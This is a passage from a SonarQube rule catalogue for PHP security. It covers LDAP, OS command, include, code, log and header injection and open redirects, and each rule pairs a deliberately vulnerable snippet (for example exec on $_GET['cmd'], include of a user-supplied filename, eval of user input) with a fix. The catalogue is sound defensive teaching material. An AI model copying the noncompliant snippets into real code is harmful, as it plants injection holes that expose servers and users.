<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul>
  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>
  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>
</ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<p>Here, the compliant code example uses the <code>hash_hmac</code> function to compute the integrity tag of the untrusted data. The underlying hash
algorithm is set to <code>sha256</code>, which is considered strong for this use case.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<h3>Pitfalls</h3>
<h4>Non-constant time authenticity checks</h4>
<p>When using a MAC to validate the authenticity of an untrusted serialized string, it is important to rely on constant time implementations. Indeed,
in most cases, classical string equality check operators work lazily. As soon as a difference is found between two strings, they consider them
different and return. Their response time will therefore vary depending on where the first difference has been found.</p>
<p>In security-sensitive contexts, this difference in execution time leaks information about the secret value being compared. It allows for timing
attacks that could void the authenticity check.</p>
<p>The compliant code example uses the <code>hash_equals</code> function to compare authentication tags. This one benefits from constant-time
implementation.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2078">
              phpsecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injection because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$ldapconn = ldap_connect("localhost");

if($ldapconn){
  $user = $_GET["user"];

  $filter = "(&amp;(objectClass=user)(uid=" . $user . "))";
  $dn = "dc=example,dc=org";

  ldap_list($ldapconn, $dn, $filter); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$ldapconn = ldap_connect("localhost");

if($ldapconn){
  $user = $ldap_escape($_GET["user"], "", LDAP_ESCAPE_FILTER);

  $filter = "(&amp;(objectClass=user)(uid=" . $user . "))";
  $dn = "dc=example,dc=org";

  ldap_list($ldapconn, $dn, $filter);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul>
  <li> <code>\</code> </li>
  <li> <code>#</code> </li>
  <li> <code>+</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>,</code> </li>
  <li> <code>;</code> </li>
  <li> <code>"</code> </li>
  <li> <code>=</code> </li>
</ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul>
  <li> <code>*</code> </li>
  <li> <code>(</code> </li>
  <li> <code>)</code> </li>
  <li> <code>\</code> </li>
  <li> <code>null</code> </li>
</ul>
<p>For PHP, the core library function <a href="https://www.php.net/manual/en/function.ldap-escape.php"><code>ldap_escape</code></a> allows sanitizing
these characters.</p>
<p>In the compliant solution example, the <code>ldap_escape</code> function is used with the <code>LDAP_ESCAPE_FILTER</code> flag, which sanitizes
potentially malicious characters in the search filter. The function can also be used with the <code>LDAP_ESCAPE_DN</code> flag, which sanitizes the
distinguished name (DN).</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4514.txt">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4515.txt">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/90">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5146">
              phpsecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$url=$_GET['url'];

header("Location: " . $url); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$url=$_GET['url'];

$allowedUrls = ['https://example.com/'];

if(in_array($url, $allowedUrls, true)){
  header("Location: " . $url);
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5145">
              phpsecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$input = $_GET["input"];

error_log($input); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$input = $_GET["input"];

if(preg_match("/[^A-Za-z0-9-_]/", $input)){
  $safeinput = '[' . base64_encode($input) . ']';
}else{
  $safeinput = $input;
}
error_log($safeinput);
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<p>Here, the example compliant code uses the <code>preg_match</code> function to check if the input contains any unsafe character. In which case, the
<code>base64_encode</code> function is used to prevent any injection while keeping the input original content.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5167">
              phpsecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=php%3AS5122&rule_key=php%3AS5122'>S5122</a>, <a href='/organizations/sopra-steria/rules?open=php%3AS5146&rule_key=php%3AS5146'>S5146</a>, <a href='/organizations/sopra-steria/rules?open=php%3AS6287&rule_key=php%3AS6287'>S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
$value = $_GET["value"];
header("X-Header: $value"); // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
$value = $_GET["value"];
if (ctype_alnum($value)) {
  header("X-Header: $value"); // Compliant
} else {
  // Error
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/index.php/HTTP_Response_Splitting">Attack Category - HTTP Response Splitting</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/113">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response
  Splitting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5335">
              phpsecurity:S5335
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Include injections occur in an application when the application retrieves data from a user or a third-party service and inserts it into an
<code>include</code> expression without sanitizing it first.</p>
<p>If an application contains an <code>include</code> expression that is vulnerable to injections, it is exposed to attacks that target the underlying
server.</p>
<h3>What is the potential impact?</h3>
<p>A user with malicious intent can create requests that will cause the <code>include</code> expression to leak valuable data or achieve remote code
execution on the server’s website.</p>
<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$filename = $_GET["filename"];
include $filename; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$INCLUDE_ALLOW_LIST = [
    "home.php",
    "dashboard.php",
    "profile.php",
    "settings.php"
];

$filename = $_GET["filename"];
if (in_array($filename, $INCLUDE_ALLOW_LIST)) {
  include $filename;
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved files</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in an <code>include</code>-type expression.</p>
<p>Create a list of authorized and secure files that you want the application to be able to load with <code>include</code>-type expressions.<br> If a
user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/97">CWE-97 - Improper Neutralization of Server-Side Includes (SSI) Within a Web Page</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/98">CWE-98 - Improper Control of Filename for Include/Require Statement in PHP Program
  ('PHP Remote File Inclusion')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/829">CWE-829 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2076">
              phpsecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$command = $_GET['cmd'];
exec($command, $output, $ret); // Noncompliant

echo ($ret == 0 ? "OK" : "KO");
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowedCommands = [["/bin/ping","-c","1","--"],["/usr/bin/host","--"]];
$cmd = $allowedCommands[$_GET["cmdId"]];
$cmd[] = $_GET["host"];

$process = proc_open($cmd, [], $pipes);
$ret = proc_close($process);

echo ($ret == 0 ? "OK" : "KO");
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of allowed commands is used. Users are only allowed to provide a command index that will be used to
access this list. The command resulting from the list access can be considered trusted.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>proc_open</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>In the example compliant code, the <code>proc_open</code> function is used in place of the less safe <code>exec</code> alternative. Moreover, the
<code>command</code> parameter of this function is set to an array. That way, the function will properly escape all the array elements and concatenate
them to form the command line to execute.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>In the example compliant code, using the <code>proc_open</code> function with an array of arguments as a parameter disables shell integration.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5334">
              phpsecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it builds and dynamically runs PHP code based on untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$operation = $_GET['operation'];
eval("product_${operation}();"); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$allowed = ["add", "remove", "update"];
$operation = $allowed[$_GET["operationId"]];
if ($operation !== "") {
    eval("product_${operation}();");
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The compliant code example uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
